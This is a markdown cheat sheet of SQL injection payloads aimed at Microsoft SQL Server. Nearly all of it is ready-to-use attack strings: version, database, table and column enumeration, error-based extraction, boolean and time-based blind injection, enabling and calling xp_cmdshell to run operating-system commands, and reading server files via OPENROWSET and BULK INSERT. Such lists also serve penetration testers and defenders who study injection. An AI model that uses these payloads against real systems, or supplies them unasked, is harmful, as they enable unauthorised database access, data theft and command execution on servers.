# MSSQL Specific Payloads

## Version Detection
```
' UNION SELECT @@version--
'; SELECT @@version--
' AND 1=CONVERT(INT,@@version)--
' AND 1=(SELECT TOP 1 @@version)--
```

## Database Enumeration
```
' UNION SELECT name FROM master..sysdatabases--
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--
' UNION SELECT name FROM sys.databases--
```

## Table Enumeration
```
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
' UNION SELECT table_name FROM information_schema.tables--
```

## Column Enumeration
```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' AND 1=CONVERT(INT,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
```

## Error-Based Extraction
```
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
' AND 1=CONVERT(INT,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
```

## Blind - Boolean
```
' AND LEN(DB_NAME())=8--
' AND ASCII(SUBSTRING(DB_NAME(),1,1))=110--
```

## Blind - Time
```
'; IF (LEN(DB_NAME())=8) WAITFOR DELAY '0:0:3'--
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=110) WAITFOR DELAY '0:0:3'--
```

## Command Execution (MSSQL)
```
'; EXEC xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'whoami'--
' AND 1=CONVERT(INT,(EXEC xp_cmdshell 'whoami'))--
```

## Enable xp_cmdshell
```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

## File Read (MSSQL)
```
' AND 1=CONVERT(INT,(SELECT CONVERT(NVARCHAR(MAX), BulkColumn) FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB)))--
'; CREATE TABLE #temp (data NVARCHAR(MAX)); BULK INSERT #temp FROM 'C:\Windows\win.ini'; SELECT * FROM #temp--
```

## Common System Tables
```
master..sysdatabases           -- Databases
sysobjects                     -- Tables (xtype='U')
syscolumns                     -- Columns
information_schema.tables      -- Tables
information_schema.columns     -- Columns
sys.server_principals          -- Logins
```
